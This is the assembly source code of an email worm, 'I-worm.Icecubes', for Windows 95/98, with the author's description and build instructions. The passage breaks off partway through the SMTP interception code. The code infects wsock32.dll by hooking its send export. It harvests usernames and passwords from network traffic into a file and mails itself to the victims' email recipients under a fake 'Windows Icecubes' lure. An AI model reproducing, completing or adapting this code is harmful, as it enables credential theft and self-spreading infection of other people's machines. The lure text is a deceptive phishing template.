;****************************************************************************;
;----------------------------------------------------------------------------;
;    			     I-worm.Icecubes v 1.05
; 				written by f0re 
;----------------------------------------------------------------------------;
;============================================================================;
;
; ABOUT
; -----
;
; Welcome to the sourcecode of my first i-worm. I have given this worm its
; name, i-worm.Icecubes, because of two reasons. First of all, here where
; i live the summer is coming..and i like icecubes in my drinks :).
; Secondly it is because of the joke behind the worm host code; when a user 
; receives the worm in his mailbox, the emailmessage looks like this:
;
; Subject: Fw: Windows Icecubes ! 
;
; ----- Original Message -----
;
; >Look at what I found on the web. This tool scans your system for hidden
; >Windows settings.
; >These settings, which are better known as the "Windows Icecubes", were
; >built in Windows by
; >the programmers at Microsoft and were supposed to be kept secret. 
; >
; >Just take a look, cause I think you might want to make some changes ;).
; >
;
;
; EXECUTION
; ---------
;
; When the worm is executed it will first check whether it is being executed
; under win 95/98. If any other version of windows is found, it will skip the
; infection procedure and run the worm-host code immediately. 
;
; If windows 95/98 is detected it will try to locate the wsock32.dll and copy it
; to wsock32.inf. It also copies itself to the windows system directory under 
; the name wsock2.dll. Then it will add the worm code to the .inf file by
; increasing the size of the last section.
; Next the worm will point the send api address in the wsock32.inf export table
; to the virus code. Finally the worm drops a wininit.ini file in the windir
; to direct windows at the next reboot to overwrite the original wsock32.dll
; with the infected wsock32.inf.
;
; Then the worm will execute the worm host code; a progressbar followed by
; funny dialog (check it out for yourself :).
;
;
; SEND HOOK
; ---------
;
; Once the wsock32.dll api-hook-routine receives control it will scan the send
; buffer for usernames and or passwords. If these are found, they are stored in the
; file <windir>\icecube.txt. If an email is being sended, the worm will extract the
; recipient(s) emailaddress(es), the from emailaddres, the recipient(s) name(s)
; and the from-name. Next it will base64 encode the host-worm file (wsock2.dll) and
; prepare a new email with the encoded host attached. The body of the email contains
; the text as shown in the ABOUT section of this description. This new email will
; be send after the original email has been send (this is also known as the
; happy99 technique).
;
;
; THANKS
; ------
;
; I'd like to thank the following persons who helped me with my many
; questions: BlackJack, MrSandman, Spo0ky, Darkman, Benny, Prizzy,
; urgo32, Lifewire, dageshi and T-2000.
;
; 
;****************************************************************************;
;
; To compile: 
;
;       tasm32 icecubes.asm /ml /m
;       tlink32 -aa icecubes.obj import32.lib
;
;       brcc32 icecubes.rc
;       brc32.exe icecubes.res 
;
;****************************************************************************;

.386
.model flat, stdcall

locals
jumps
	extrn ExitProcess:PROC
	extrn DialogBoxParamA:PROC
	extrn GetModuleHandleA:PROC
	extrn EndDialog:PROC
	extrn GetWindowRect:PROC
	extrn GetDesktopWindow:PROC
	extrn MoveWindow:PROC
	extrn CreateThread:PROC
	extrn SendDlgItemMessageA:PROC
	extrn SetDlgItemTextA:PROC
	extrn CloseHandle:PROC
	extrn GetDlgItemTextA:PROC
	extrn GetModuleHandleA:PROC
	extrn GetVersion:PROC

.data

    Start:
	xor ebp, ebp

    CheckWindowsVersion:
	call GetVersion
	or eax, eax
	jz ReturnToWormHost

    MainRoutines:
	pushad
	call GET_GETPROCADDRESS_API_ADDRESS		
	call GET_WINDIR
	call GET_SYSDIR
	call INFECT_WSOCK
	call COPY_HOST_FILE
	popad

    ReturnToWormHost:
	jmp OriginalHost

;==============================[ includes ]==================================;

	include windows.inc
	include wsocks.inc
	include myinc.inc

;=============================[ ic-data.inc ]===============================;

; get_gpa.inc data
	kernel32address 		dd 0BFF70000h
	numberofnames 			dd ?
	addressoffunctions 		dd ?
	addressofnames 			dd ?
	addressofordinals 		dd ?
	AONindex 			dd ?
	AGetProcAddress 		db "GetProcAddress", 0	
	AGetProcAddressA 		dd 0			

; directory.inc data
	currentdir 			db 100h dup(0)
	sysdir 				db 100h dup(0)
	windir 				db 100h dup(0)
	AGetSystemDirectory 		db "GetSystemDirectoryA",0
	AGetWindowsDirectory 		db "GetWindowsDirectoryA",0
	ASetCurrentDirectory		db "SetCurrentDirectoryA",0

; infect_wsock.inc
	wsock32dll 			db "Wsock32.dll",0
	wsock32inf 			db "Wsock32.inf",0
	ACopyFile 			db "CopyFileA",0		
	infectionflag 			db 0
	AFindFirstFile 			db "FindFirstFileA",0
	myfinddata 			WIN32_FIND_DATA <>
	filesize			dd 0
	memory 				dd 0
	ADeleteFile 			db "DeleteFileA",0

; infect_file.inc
	ASetFileAttributes 		db "SetFileAttributesA",0
	ACreateFile			db "CreateFileA",0
	ACreateFileMapping 		db "CreateFileMappingA",0
	AMapViewOfFile 			db "MapViewOfFile",0	
	filehandle			dd 0	
	maphandle 			dd 0
	mapaddress 			dd 0	
	PEheader 			dd 0
	imagebase 			dd 0
	imagesize 			dd 0
	wnewapiaddress 			dd 0
	AUnmapViewOfFile 		db "UnmapViewOfFile",0
	ACloseHandle 			db "CloseHandle",0
	ASetFilePointer 		db "SetFilePointer",0
	ASetEndOfFile 			db "SetEndOfFile",0
	ASetFileTime 			db "SetFileTime",0

; hook_api.inc
	woldapiaddress 			dd 0

; rva_to_raw.inc
	rva2raw 			dd 0	

; get_api.inc
	user32address			dd 0
	wsock32address 			dd 0	

; create_ini_file.inc
	inifile 			db "wininit.ini",0
	writtensize 			dw 0
	inicrlf				db 0dh,0ah,0
	rename				db "[rename]",13,10	
	slashsign 			db "\",0
	equalsign			db "=",0
	writtenbytes			dd 0
	AWriteFile 			db "WriteFile",0

; ws_copy_host_file
	AGetModuleFileName 		db "GetModuleFileNameA",0

; get_bases.inc
	ALoadLibrary 			db "LoadLibraryA",0	
	k32 				db "KERNEL32.dll",0
	user32 				db "USER32.dll",0
	wsock32 			db "WSOCK32.dll",0

; host_code.inc
	dlgrect 			RECT <>
	desktoprect 			RECT <>	
	dlgwidth			dd 0
	dlgheight 			dd 0
	threadid			dd 0
	initflag			dd 0
	okflag				dd 0
	flag	 			dd 0
	pastvalue			dd 0
	currentvalue			db '2',0
	doneflag			dd 0
	value11				db "Days",0
	value12				db "Weeks",0
	value13				db "Months",0
	value14				db "Years",0
	value3				db "5000",0
	value4				db "17",0

; ic.asm
	hInst 				dd 0

; write_to_file.inc
	passwordfile			db "icecube.txt",0

; ws_intercept.inc
	socketh 			dd 0
	status 				db 0
	AGlobalAlloc 			db "GlobalAlloc",0
	fromaddress 			dd 0
	fromsize    			dd 0
	rcptnumber 			dd 0
	rcpt_buffer_address 		dd 0
	rcpt_size_address		dd 0
	totalrcptsize			dd 0
	fromtag				db 'From:',0
	totag				db 'To:',0
	mimeendtag			db '>',0
	mimefrom_address 		dd 0
	mimefromsize			dd 0
	fromstatus			db 0
	tostatus			db 0
	toendtag			db 'Subject:',0
	mimetosize			dd 0
	mimeto_address 			dd 0

; ws_b64_encoder.inc
	encTable        		db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv'
         	           		db 'wxyz0123456789+/'
; ws_attachment
	wsock2				db "Wsock2.dll",0	
	smHnd           		dd 0       			
	dmHnd           		dd 0	
	bytesread       		dd 0    
	encodedsize 			dd 0	
	AReadFile 			db "ReadFile",0
	AGetFileSize 			db "GetFileSize",0

; ws_send_mail
	email_buffer_address 		dd 0	
	email_size			dd 0
	datatag 			db 'DATA',0dh,0ah
	emailid				db 'Message-ID: <a1234>',0dh,0ah
	emailstart  			db 'Subject: Fw: Windows Icecubes !',0dh,0ah
		        		db 'MIME-Version: 1.0',0dh,0ah
                			db 'Content-Type: multipart/mixed; boundary="a1234"',0dh,0ah
                			db 0dh,0ah,'--a1234',0dh,0ah
					db 'Content-Type: text/plain; charset=us-ascii',0dh,0ah
	        	    		db 'Content-Transfer-Encoding: 7bit',0dh,0ah,0dh,0ah
					db 0dh,0ah
					db '----- Original Message -----', 0dh,0ah
					db 0dh,0ah
					db '>Look at what I found on the web. This tool scans your system for hidden Windows settings.', 0dh, 0ah
					db '>These settings, which are better known as the "Windows Icecubes", were built in Windows by', 0dh,0ah
					db '>the programmers at Microsoft and were supposed to be kept secret. ',0dh,0ah
					db '>',0dh,0ah
					db '>Just take a look, cause I think you might want to make some changes ;).',0dh,0ah
		        		db '>',0dh,0ah
		          		db 0dh,0ah
  			   		db 0dh,0ah,'--a1234',0dh,0ah
                			db 'Content-Type: application/octet-stream; name="Icecubes.exe"'
                			db 0dh,0ah,'Content-Transfer-Encoding: base64',0dh,0ah
	                		db 'Content-Disposition: attachment; filename="Icecubes.exe"',0dh,0ah,0dh,0ah
	emailend    			db 0dh,0ah
	emailtail   			db 0dh,0ah,0dh,0ah,'--a1234--',0dh,0ah,0dh,0ah
	endtag				db 0Dh,0Ah,2Eh,0Dh,0Ah		
	timedate			SYSTEMTIME <>
	AMessageBox 			db "MessageBoxA",0
	AGetSystemTime			db "GetSystemTime",0	
	msgmessage 			db "Windows detected icecubes on your harddrive.",10,13
					db "This may cause the system to stop responding.",10,13
					db "Do you want Windows to remove all icecubes ?",0	
	windowtitle 			db "I-worm.Icecubes / f0re",0	
	ASend 				db "send",0
	ARecv 				db "recv",0
	recvbuffer			db 100h dup(0)

;============================[ ic-get_gpa.inc ]=============================;

GET_GETPROCADDRESS_API_ADDRESS proc
	
    LoadExportTableData:
    	mov edi, [ebp + kernel32address]		; get exporttable
	add edi, [edi + 3ch]				; address from
    	mov esi, [edi + 78h]				; kernel's PE header
	add esi, [ebp + kernel32address]		
    	
	mov eax, dword ptr [esi + 18h]			
	mov [ebp + numberofnames], eax			; save number of names
		
	mov eax, dword ptr [esi + 1Ch]			; get ra of table with 
    	add eax, [ebp + kernel32address]		; pointers to funtion
    	mov [ebp + addressoffunctions], eax		; addresses

	mov eax, dword ptr [esi + 20h]			; get ra of table with
    	add eax, [ebp + kernel32address]		; pointers to names
    	mov [ebp + addressofnames], eax			; of functions
	
	mov eax, dword ptr [esi + 24h]			; get ra of table with
	add eax, [ebp + kernel32address]		; pointers to ordinals
	mov [ebp + addressofordinals], eax		; of functions

    BeginProcAddressSearch:
    	mov esi, [ebp + addressofnames]			; search for GetProc
    	mov [ebp + AONindex], esi			; Address API in names
    	mov edi, [esi]					; table
    	add edi, [ebp + kernel32address]		
    	xor ecx, ecx					
    	lea ebx, [ebp + AGetProcAddress]		

    TryAgain:
    	mov esi, ebx					

    MatchByte:
    	cmpsb
    	jne NextOne					
    	cmp byte ptr [esi], 0				; did the entire string
    	je GotIt					; match ?
    	jmp MatchByte

    NextOne:
    	inc cx						
    	add dword ptr [ebp + AONindex], 4		; get next namepointer
    	mov esi, [ebp + AONindex]			; in table (4 dwords)
    	mov edi, [esi]					
    	add edi, [ebp + kernel32address]		; align with kernelbase
    	jmp TryAgain

    GotIt:
    	shl ecx, 1					
    	mov esi, [ebp + addressofordinals]		; ordinal = nameindex *
    	add esi, ecx					; size of ordinal entry
    	xor eax, eax					; + ordinal table base
    	mov ax, word ptr [esi]				
    	shl eax, 2					; address of function =
    	mov esi, [ebp + addressoffunctions]		; ordinal * size of
    	add esi, eax					; entry of address 
    	mov edi, dword ptr [esi]			; table + base of 
    	add edi, [ebp + kernel32address]		; addresstable
    	mov [ebp + AGetProcAddressA], edi		; save GPA address
	ret	
  
GET_GETPROCADDRESS_API_ADDRESS endp

;===========================[ ic-get_bases.inc ]============================;

GET_WSOCK32_BASE_ADDRESS proc

    LoadWsock32:
	lea eax, [ebp + wsock32]			; not found, then
	push eax					; load the dll
	lea eax, [ebp + ALoadLibrary]			; first
	call GETAPI
	mov [ebp + wsock32address], eax
	ret

GET_WSOCK32_BASE_ADDRESS endp

GET_USER32_BASE_ADDRESS proc

    GetUser32Base:
	lea eax, [ebp + user32]				
	push eax					
	lea eax, [ebp + ALoadLibrary]			
	call GETAPI					
	mov [ebp + user32address], eax
	ret

GET_USER32_BASE_ADDRESS endp

;============================[ ic-get_api.inc ]=============================;

GETAPI proc

	push eax					
	push dword ptr [ebp + kernel32address]		; load kernelbase
	call [ebp + AGetProcAddressA]			; and get api address
	jmp eax						; call the api
	ret						; return
	 
GETAPI endp

GETUAPI proc

	push eax					
	push dword ptr [ebp + user32address]		; load wsockbase
	call [ebp + AGetProcAddressA]			; and get api address
	jmp eax
	ret

GETUAPI endp

GETWAPI proc

	push eax					
	push dword ptr [ebp + wsock32address]		; load wsockbase
	call [ebp + AGetProcAddressA]			; and get api address
	jmp eax
	ret

GETWAPI endp

;==========================[ ic-directory.inc ]=============================;
	
GET_WINDIR proc

    GetWindowsDir:
	push 128h					; size of dirstring		
	lea eax, [ebp + windir]				; save it here
	push eax
	lea eax, [ebp + AGetWindowsDirectory]		; get windowsdir
	call GETAPI
	ret

GET_WINDIR endp

GET_SYSDIR proc

    GetSystemDir:
	push 128h					; size of dirstring		
	lea eax, [ebp + sysdir]				; save it here
	push eax
	lea eax, [ebp + AGetSystemDirectory]		; get system dir
	call GETAPI
	ret

GET_SYSDIR endp

SET_WINDIR proc

    SetWindowsDir:
	lea eax, [ebp + windir]				; change to sysdir
	push eax
	lea eax, [ebp + ASetCurrentDirectory]	
	call GETAPI
	ret

SET_WINDIR endp

SET_SYSDIR proc

    SetSystemDir:
	lea eax, [ebp + sysdir]				; change to sysdir
	push eax
	lea eax, [ebp + ASetCurrentDirectory]	
	call GETAPI
	ret

SET_SYSDIR endp

;=========================[ ic-infect_wsock.inc ]===========================;

INFECT_WSOCK proc

    WsockSetSystemDirectory:
	call SET_SYSDIR
 
    CopyWSockFile:
	push 00h
	lea eax, [ebp + wsock32inf]
	push eax	
	lea eax, [ebp + wsock32dll]
	push eax
	lea eax, [ebp + ACopyFile]
	call GETAPI
	
    SearchWsockFile:
	mov [ebp + infectionflag], 00h
	lea eax, [ebp + myfinddata]			; win32 finddata structure
	push eax
	lea eax, [ebp + wsock32inf]			; get wsock32.inf
	push eax
	lea eax, [ebp + AFindFirstFile]			; find the first file
	call GETAPI
	cmp eax, 0FFFFFFFh
	je WsockEndSearch
		
    GoInfectWsockInf:
	mov ecx, [ebp + myfinddata.fd_nFileSizeLow]	; ecx = filesize
	mov [ebp + filesize], ecx			; save the filesize
	add ecx, Leap - Start + 1000h			; filesize + virus
	mov [ebp + memory], ecx				; + workspace = memory
	call INFECT_FILE
	cmp [ebp + infectionflag], 01
	je DeleteWsockFile

	call CREATE_INI_FILE
	jmp WsockEndSearch

    DeleteWsockFile:
	lea eax, [ebp + wsock32inf]
	push eax
	lea eax, [ebp + ADeleteFile]
	call GETAPI

    DeleteIniFile2:
	call SET_WINDIR
	lea eax, [ebp + inifile]
	push eax
	lea eax, [ebp + ADeleteFile]
	call GETAPI

    WsockEndSearch:
	ret

INFECT_WSOCK endp

;=========================[ ic-infect_file.inc ]============================;

INFECT_FILE proc

     SetAttributesToNormal:
	push 80h	
	lea esi, [ebp + myfinddata.fd_cFileName]	; esi = filename	
	push esi
	lea eax, [ebp + ASetFileAttributes]	
	call GETAPI

     OpenFile:
	push 0						; template handle=0
	push 20h					; attributes=any file
	push 3						; type= existing file
	push 0						; security option = 0
	push 1						; shared for read
	push 80000000h or 40000000h			; generic read write
	push esi					; offset file name
	lea eax, [ebp + ACreateFile]
	call GETAPI

	cmp eax, 0FFFFFFFFh
	je InfectionError
	mov [ebp + filehandle], eax

;-------------------------------[ map file ]---------------------------------;

    CreateFileMapping:					; allocates the memory
	push 0						; filename handle = 0
	push dword ptr [ebp + memory]			; max size = memory
	push 0						; minumum size = 0
	push 4						; read / write access
	push 0						; sec. attrbs= default
	push dword ptr [ebp + filehandle]
	lea eax, [ebp + ACreateFileMapping]
	call GETAPI					; eax = new map handle

	mov [ebp + maphandle], eax
	or eax, eax
	jz CloseFile					

    MapViewOfFile:
	push dword ptr [ebp + memory]			; memory to map
	push 0						; file offset
	push 0						; file offset
	push 2						; file map write mode
	push eax					; file map handle
	lea eax, [ebp + AMapViewOfFile]			; ok map the file
	call GETAPI

	or eax, eax
	jz CloseMap
	mov esi, eax					; esi= base of map
	mov [ebp + mapaddress], esi			; save that base

    DoSomeChecks:
	cmp word ptr [esi], 'ZM'			; an exe file?
	jne UnmapView	
	cmp word ptr [esi + 38h], 'll'			; already infected?
	jne OkGo
	mov [ebp + infectionflag], 1			; set infectionflag
	jmp UnmapView	

    OkGo:
	mov ebx, dword ptr [esi + 3ch]			
	cmp ebx, 200h
	ja UnmapView
	add ebx, esi
	cmp dword ptr [ebx], 'EP'			; is it a PE file ?
	jne UnmapView
		
	mov [ebp + PEheader], ebx			; save ra PE header
	mov esi, ebx
	mov eax, [esi + 34h]
	mov [ebp + imagebase], eax			; save imagebase
	
;------------------------------[ append section ]----------------------------;

    LocateBeginOfLastSection:
	movzx ebx, word ptr [esi + 20d]			; optional header size
	add ebx, 24d					; file header size
	movzx eax, word ptr [esi + 6h]			; no of sections
	dec eax						; (we want the last-1
	mov ecx, 28h					; sectionheader)
	mul ecx						; * header size
	add esi, ebx					; esi = begin of last 
	add esi, eax					; section's header

    ChangeLastSectionHeader:
	or dword ptr [esi + 24h], 00000020h or 20000000h or 80000000h 

    NewAlignedPhysicalSize:
	mov eax, dword ptr [esi + 10h]			; old phys size
	push eax					; save it

	add eax, Leap-Start
	mov ecx, [ebp + PEheader]
	mov ecx, [ecx + 38h]
	div ecx						; and align it to
	inc eax						; the sectionalign
	mul ecx
	mov dword ptr [esi + 10h], eax  		; save it

    VirtualSizeCheck:
	mov edi, dword ptr [esi + 8h]			; get old 
	cmp eax, edi					; virtualsize
	jge NewVirtualSize

    VirtualSizeIsVirtual:
	add edi, Leap-Start				
	mov eax, edi
	mov ecx, [ebp + PEheader]
	mov ecx, [ecx + 38h]
	div ecx						; and align it to
	inc eax						; the sectionalign
	mul ecx

    NewVirtualSize:
	mov [esi + 8h], eax				; save new value

    NewAlignedImageSize:
	mov eax, dword ptr [esi + 0ch]			; get virtual offset	
	add eax, dword ptr [esi + 8h]			; + new virtual size
	mov [ebp + imagesize], eax			; = new imagesize

    NewAlignedFileSize:
	mov eax, dword ptr [esi + 10h]			; get new phys size
	add eax, dword ptr [esi + 14h]			; add offset of phys
	mov ecx, [ebp + PEheader]
	mov ecx, [ecx + 3ch]
	div ecx						; and align it to
	inc eax						; the filealign
	mul ecx	
	mov [ebp + filesize], eax			; size = filesize

    CalculateNewWsockApiAddress:
	pop eax
	push eax
	add eax, dword ptr [esi + 0ch]			; + virtual offset
	add eax, InterceptWsockApiCall - Start		; + ip
	mov [ebp + wnewapiaddress], eax			; new api address
	jmp HookDaApi

    HookDaApi:
	push esi
	call HOOK_API
	pop esi

    CopyVirusToEndOfFile:
	pop eax
	mov edi, eax
	add edi, [ebp + mapaddress]			; mapaddress
	add edi, [esi + 14h]				; add raw data offset
	lea esi, [ebp + Start]				; copy virus
	mov ecx, (Leap-Start)/4 + 4
	cld
	rep movsd

    UpdatePEHeaderWithChanges:
	mov esi, [ebp + mapaddress]	
	mov word ptr [esi + 38h], 'll'			; set infectionmark
	mov esi, [ebp + PEheader]	
	mov eax, [ebp + imagesize]		
	mov [esi + 50h], eax				; set new imagesize
    	
;--------------------------------[ unmap file ]------------------------------;

    UnmapView:
	push dword ptr [ebp + mapaddress]
	lea eax, [ebp + AUnmapViewOfFile]
	call GETAPI

    CloseMap:
	push dword ptr [ebp + maphandle]
	lea eax, [ebp + ACloseHandle]
	call GETAPI

  	push 0
	push 0
	push dword ptr [ebp + filesize]
	push dword ptr [ebp + filehandle]
	lea eax, [ebp + ASetFilePointer]
	call GETAPI

	push dword ptr [ebp + filehandle]
	lea eax, [ebp + ASetEndOfFile]
	call GETAPI

;--------------------------------[ close file ]------------------------------;

    CloseFile:
	push dword ptr [ebp + myfinddata.fd_ftLastWriteTime]
	push dword ptr [ebp + myfinddata.fd_ftLastAccessTime]
	push dword ptr [ebp + myfinddata.fd_ftCreationTime]
	push dword ptr [ebp + filehandle]
	lea eax, [ebp + ASetFileTime]
	call GETAPI

	push [ebp + filehandle]
	lea eax, [ebp + ACloseHandle]
	call GETAPI

    InfectionError:
	push dword ptr [ebp + myfinddata.fd_dwFileAttributes]
	lea eax, [ebp + myfinddata.fd_cFileName]	
	push eax
	lea eax, [ebp + ASetFileAttributes]
	call GETAPI
	ret

INFECT_FILE endp

;===========================[ ic-hook_api.inc ]=============================;

HOOK_API proc

    LoadWSockExportTableData:
    	mov edi, [ebp + PEheader]
    	mov esi, dword ptr [edi + 78h]			; rva export table
      
	mov edx, esi					; get RVA
	call RVA_TO_RAW
	mov esi, ecx
	mov eax, dword ptr [esi + 18h]			
	mov [ebp + numberofnames], eax			; save number of names

	push esi
	mov eax, dword ptr [esi + 1Ch]			; get ra of table with 

	mov edx, eax
	call RVA_TO_RAW
	mov eax, ecx					; pointers to funtion
	mov [ebp + addressoffunctions], eax		; addresses

	pop esi
	push esi
	mov eax, dword ptr [esi + 20h]			; get ra of table with
	
	mov edx, eax
	call RVA_TO_RAW
	mov eax, ecx					; pointers to names
    	mov [ebp+addressofnames],  eax			; of functions

	pop esi
	push esi
	
	mov eax, dword ptr [esi + 24h]			; get ra of table with
	mov edx, eax
	call RVA_TO_RAW
	mov eax, ecx					; pointers to ordinals
	mov [ebp+addressofordinals], eax		; of functions
	pop esi

    BeginSendAddressSearch:
    	mov esi, [ebp + addressofnames]			; search for 
    	mov [ebp + AONindex], esi			; API in names
    	mov edi, [esi]					; table

	mov edx, edi
	call RVA_TO_RAW
	mov edi, ecx
    	xor ecx, ecx	

    HookSendApi:
    	lea ebx, [ebp + ASend]		

    OkTryAgain:
    	mov esi, ebx					

    MatchByteNow:
    	cmpsb
    	jne NextOneNow					
    	cmp byte ptr [esi], 0				; did the entire string
    	je YesGotIt					; match ?
    	jmp MatchByteNow

    NextOneNow:
    	inc cx						
    	add dword ptr [ebp + AONindex], 4		; get next namepointer
    	mov esi, [ebp + AONindex]			; in table (4 dwords)
    	mov edi, [esi]					

	push ebx
	push ecx

	mov ebx, [ebp + mapaddress]
	mov edx, edi
	call RVA_TO_RAW
	mov edi, ecx

	pop ecx
	pop ebx
    	jmp OkTryAgain

    YesGotIt:
    	shl ecx, 1					
    	mov esi, [ebp + addressofordinals]		; ordinal = nameindex *
    	add esi, ecx					; size of ordinal entry
    	xor eax, eax					; + ordinal table base
    	mov ax, word ptr [esi]				; offset of address
    	shl eax, 2					; of function = ordinal
    	mov esi, [ebp + addressoffunctions]		; * size of entry of
    	add esi, eax					; address table
	mov edi, dword ptr [esi]			; get address

    SaveNewWsockApiAddress:
	mov [ebp + woldapiaddress], edi			; save it 

    ChangeWsock:
	mov eax, dword ptr [ebp + wnewapiaddress]	; new api address
	mov dword ptr [esi], eax			; set it
	ret

HOOK_API endp

;===========================[ ic-rva_to_raw.inc ]===========================;

RVA_TO_RAW proc

    ; In:  edx - RVA to convert
    ; Out: ecx - Pointer to RAW data or NULL if error

    GetRaw:
	mov ebx, [ebp + mapaddress]
	mov [ebp + rva2raw], edx

	mov esi, dword ptr [ebx + 3ch]
	add esi, ebx					; esi=offset peheader
	xor ecx, ecx
	mov cx, word ptr [esi + 06h]			; ecx = nr. of sections
	xor edi, edi
	mov di, word ptr [esi + 20d]			; optional header size
	add esi, 24d					; file header size
	add edi, esi					

    FindCorrespondingSection:
	mov eax, dword ptr [ebp + rva2raw]		; rva we want into raw
	mov edx, dword ptr [edi + 12d]			; section RVA
	sub eax, edx
	cmp eax, dword ptr [edi+08d]			; section size
	jb SectionFound

    NotThisSection: 
	add edi, 40d
	loop FindCorrespondingSection

    EndRawSearch:
	ret

    SectionFound:
	mov ecx, dword ptr [edi+20d]			; pntr to section's raw
	sub edx, ecx					; data from beginning 
	add ecx, eax					; of file
	add ecx, ebx
	ret

RVA_TO_RAW endp

;=========================[ ic-create_ini_file.inc ]========================;

CREATE_INI_FILE proc

    IniGetSetWindowsDir:
	call SET_WINDIR

    CreateInstallIni:
	push 0						; template handle=0
	push 20h					; attributes=any file
	push 4						; type= new file
	push 0						; security option = 0
	push 1						; shared for read
	push 80000000h or 40000000h			; generic read write
	lea eax, [ebp + inifile]
	push eax					; offset file name
	lea eax, [ebp + ACreateFile]
	call GETAPI	
	mov [ebp + filehandle], eax

    SetIniFilePointerToEnd:
	push 02h
	push 00h
	push 00h
	push [ebp + filehandle]
	lea eax, [ebp + ASetFilePointer]
	call GETAPI
	mov dword ptr [ebp + writtensize], 00h

    WriteInstallIniLoop:
	lea esi, [ebp + inicrlf]			
	xor ecx, ecx
	call StringSize
	call Write

	lea esi, [ebp + rename]				; write 'rename'
	mov word ptr [ebp + writtensize], 0Ah
	call Write

	lea esi, [ebp + sysdir]				; write systemdir
	xor ecx, ecx
	call StringSize
	call Write

	lea esi, [ebp + slashsign]			; write slash
	xor ecx, ecx
	call StringSize
	call Write

    WriteWsock32Dll:
	lea esi, [ebp + wsock32dll]			; write original dll
	xor ecx, ecx
	call StringSize
	call Write

    WriteOn:
	lea esi, [ebp + equalsign]			; write original dll
	xor ecx, ecx
	call StringSize
	call Write

	lea esi, [ebp + sysdir]				; write systemdir
	xor ecx, ecx
	call StringSize
	call Write

	lea esi, [ebp + slashsign]			; write slash
	xor ecx, ecx
	call StringSize
	call Write

     WriteInfectedWsock:
	lea esi, [ebp + wsock32inf]			; write original dll
	xor ecx, ecx
	call StringSize
	call Write
	jmp CloseInstallIni

    StringSize:
	cmp byte ptr [esi + ecx], 0h
	je GotSize
	inc ecx
	jmp StringSize

    GotSize:
	mov word ptr [ebp + writtensize], cx
	ret	

    Write:
	push 0h
	lea eax, [ebp + writtenbytes]
	push eax
	xor eax, eax
	mov ax, word ptr [ebp + writtensize]
	push eax
	push esi
	push dword ptr [ebp + filehandle]
	lea eax, [ebp + AWriteFile]
	call GETAPI
	ret

    CloseInstallIni:
	lea esi, [ebp + inicrlf]			; write original dll
	xor ecx, ecx
	call StringSize
	call Write

	push dword ptr [ebp + filehandle]
	lea eax, [ebp + ACloseHandle]
	call GETAPI
	ret

CREATE_INI_FILE endp

;=========================[ ic-copy_host_file.inc ]=========================;

COPY_HOST_FILE proc

    GetCurrentHostPath:
	push 100h
	lea eax, [ebp + currentdir]
	push eax
	push 00h
	lea eax, [ebp + AGetModuleFileName]
	call GETAPI

    SetSysDirectory:
	call SET_SYSDIR
    
    CopyWormHostFile:
	push 00h	
	lea eax, [ebp + wsock2]
	push eax
	lea eax, [ebp + currentdir]
	push eax
	lea eax, [ebp + ACopyFile]
	call GETAPI
	ret

COPY_HOST_FILE endp

;=========================[ ic-ws_intercept.inc ]===========================;

INTERCEPT_WSOCK proc

    InterceptWsockApiCall:
	push ebp
	call GetDelta

    GetDelta:
	pop ebp
	sub ebp, offset GetDelta
	pushad

    CheckStatus:
	mov eax, [esp+(8*4)+(1*4)+4 + 0]	 	; get send() socket
	mov [ebp + socketh], eax			; save it
	mov esi, [esp+(8*4)+(1*4)+4 + 4]	 	; send() buffer
	mov ecx, [esp+(8*4)+(1*4)+4 + 8]		; size of buffer
	
	pushad
 	call GET_GETPROCADDRESS_API_ADDRESS
	popad
      
    CheckForSecurityInfo:
	cmp [esi], 'RESU'
	je StoreBufferData
  	cmp [esi], 'SSAP'
	jne DontStore

    StoreBufferData:
	pushad
	call WRITE_TO_FILE
	popad
    
    DontStore:
	cmp [ebp + status], 00h				; monitoring==true ?
	je CheckMailFrom				; yes, we are
	cmp [ebp + status], 02h
	je CheckRcptTo
	cmp [ebp + status], 03h
	je CheckMimeFrom
	cmp [ebp + status], 05h
	je CheckQuit
	jmp Continue

    CheckMailFrom:
	mov esi, [esp+(8*4)+(1*4)+4 + 4]	 	; send() buffer
	mov ecx, [esp+(8*4)+(1*4)+4 + 8]		; size of buffer		
	cmp [esi], 'LIAM'
	jne Continue

    StoreMailFromTag:
	pushad
	call WRITE_TO_FILE
	popad

    SaveMailFrom:
	mov [ebp + fromsize], ecx
	push ecx
	push esi

	push ecx
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI

	or eax, eax
	jz ErrorWhileSending

	pop esi
	pop ecx	
	mov [ebp + fromaddress], eax
	mov edi, eax
	rep movsb
	mov [ebp + status], 02h

    CheckRcptTo:
	mov esi, [esp+(8*4)+(1*4)+4 + 4]	 	; send() buffer
	mov ecx, [esp+(8*4)+(1*4)+4 + 8]		; size of buffer		
	cmp [esi], 'TPCR'	
	jne CheckData

    AllocateRcptMemory:
	cmp [ebp + rcptnumber], 00h
	jne SaveRcptTo
	
	push ecx
	push esi

	push 500h
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI
	or eax, eax
	jz ErrorWhileSending				; mem for rctp email
	mov [ebp + rcpt_buffer_address], eax		; addresses

	push 100h
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI
	or eax, eax
	jz ErrorWhileSending				; mem for size of rctp 
	mov [ebp + rcpt_size_address], eax		; email addresses

	pop esi
	pop ecx	

    SaveRcptTo:
	push ecx					; store rcpt string
	mov edi, [ebp + rcpt_buffer_address]
	mov eax, [ebp + totalrcptsize]
	add edi, eax
	rep movsb
	pop ecx

	mov edi, [ebp + rcpt_size_address]		; store rcpt string size
	mov eax, [ebp + rcptnumber]
	mov edx, 04h
	mul edx
	add edi, eax
	mov dword ptr [edi], ecx

	mov eax, [ebp + totalrcptsize]			; calculate total size
	add eax, ecx					; of rcpts
	mov [ebp + totalrcptsize], eax

	mov eax, [ebp + rcptnumber]			; calculate number of 
	add eax, 01h					; rcpt we have
	mov [ebp + rcptnumber], eax
	jmp Continue

    CheckData:
	mov esi, [esp+(8*4)+(1*4)+4 + 4]	 	; send() buffer
	mov ecx, [esp+(8*4)+(1*4)+4 + 8]		; size of buffer		
	cmp [esi], 'ATAD'		
	jne Continue
	mov [ebp + status], 03h

    CheckMimeFrom:
	mov esi, [esp+(8*4)+(1*4)+4 + 4]	 	; send() buffer
	mov ecx, [esp+(8*4)+(1*4)+4 + 8]		; size of buffer

    MimeFromLoop:
	lea edi, [ebp + fromtag]
	push ecx
	push esi
	mov ecx, 05h
	rep cmpsb
	pop esi
	pop ecx
	je SearchMimeFromEnd
	inc esi
